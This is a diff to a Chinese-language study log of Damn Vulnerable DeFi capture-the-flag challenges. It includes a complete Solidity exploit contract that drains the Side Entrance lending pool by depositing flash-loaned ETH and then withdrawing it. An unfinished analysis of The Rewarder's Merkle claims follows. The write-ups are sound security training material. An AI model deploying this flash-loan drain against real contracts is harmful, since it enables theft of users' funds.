@@ -1158,4 +1158,88 @@ contract Exploit {
 - [DamnVulnerableDeFi-03-Truster.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-03-Truster.t.sol)
 
 
+### 2024.09.16
+
+- 繼續進行每日解一題挑戰
+
+#### [DamnVulnerableDeFi-04] Side Entrance
+
+- 過關條件: 把 `SideEntranceLenderPool` 合約持有的 1000 顆 ETH 偷走，轉到 recovery 帳號
+- 解法:
+  - 這題有點水，直接講解法
+  - 我們只要發起 `flashLoan()` 呼叫
+  - 在 `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` 的 callback context 中，呼叫 `deposit()` 把閃電貸借款直接存進去
+  - 因為 `SideEntranceLenderPool` 只是單純的檢查 `flashLoan()` 前與後的 balance，所以利用這種方式就可以讓我們憑空增加 `balances[msg.sender]`
+  - 最後再呼叫 `withdraw()` 把 `SideEntranceLenderPool` 合約的 ETH 幹走即可
+
+```solidity
+function test_sideEntrance() public checkSolvedByPlayer {
+    Exploit exp = new Exploit(pool, ETHER_IN_POOL);
+    exp.start();
+    payable(recovery).transfer(ETHER_IN_POOL);
+}
+
+contract Exploit {
+    SideEntranceLenderPool pool;
+    uint256 ETHER_IN_POOL;
+
+    constructor(SideEntranceLenderPool _pool, uint256 _ETHER_IN_POOL) {
+        pool = _pool;
+        ETHER_IN_POOL = _ETHER_IN_POOL;
+    }
+    
+    function start() external {
+        pool.flashLoan(ETHER_IN_POOL);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    function execute() external payable {
+        pool.deposit{value: msg.value}();
+    }
+
+    receive() external payable {}
+}
+```
+
+- [DamnVulnerableDeFi-04-SideEntrance.t.sol](/Writeup/DeletedAccount/DamnVulnerableDeFi-04-SideEntrance.t.sol)
+
+
+### 2024.09.18
+
+- 繼續進行每日解一題挑戰 -> 挑戰失敗🥲
+- 今天卡關，花了比較多時間在理解題目代碼
+- 先把解題紀錄寫下來，明天繼續補
+
+#### [DamnVulnerableDeFi-05] The Rewarder
+
+- 過關條件:
+  1. `TheRewarderDistributor` 合約的 DVT 代幣餘額低於 0.01 顆
+  2. `TheRewarderDistributor` 合約的 WETH 代幣餘額低於 0.001 顆
+  3. 上述資產都被轉到 `recovery` 帳號
+- 解法
+  - 這一題的知識背景主要是 Bitmaps
+  - 還有 Merkle Tree
+  - 已知 Claimable Leaves 是 `/test/the-rewarder/dvt-distribution.json` 與 `/test/the-rewarder/weth-distribution.json` 紀錄的內容
+    - 每個 Leaf 存在 `address` 和可領取的 `amount` 元素
+    - `bytes32 leaf = keccak256(abi.encodePacked(address, amount));`
+    - 誰左誰右基本上是看 leaf 值誰大誰小
+  - `player` 地址也有少量可領取的 distribution (見下方第一段程式碼)
+  - 要達成過關條件，我第一個想到的是有沒有透過 `clean(IERC20[] calldata tokens)` 做到
+    - 但我們必須要使 `distributions` 全部被發出去
+  - 我們操縱的錢包，被限制在只能使用 `player`，所以沒辦法直接利用
+    - 所以通過 `if (distributions[token].remaining == 0)` 基本上沒可能了，畢竟我們只能 claim `player` 的微量 distributions
+  - 在 `createDistribution()` 身上搞事也沒辦法，因為要把 DVT, WETH 偷走，想搞事會遇到 `if (distributions[token].remaining != 0) revert StillDistributing();` 語句
+  - 那麼可以搞事的地方就剩下 `claimRewards()` 了
+  - 首先好奇的地方是: `claimReward()` 是如何判斷一個錢包地址已經 Claim 過了？有沒有可能存在 Double Claim 的可能性？
+  - 
+
+```solidity=
+function test_theRewarder() public checkSolvedByPlayer {
+    console.log(player); // 0x44E97aF4418b7a17AABD8090bEA0A471a366305C
+}
+```
+
+
+
 <!-- Content_END -->
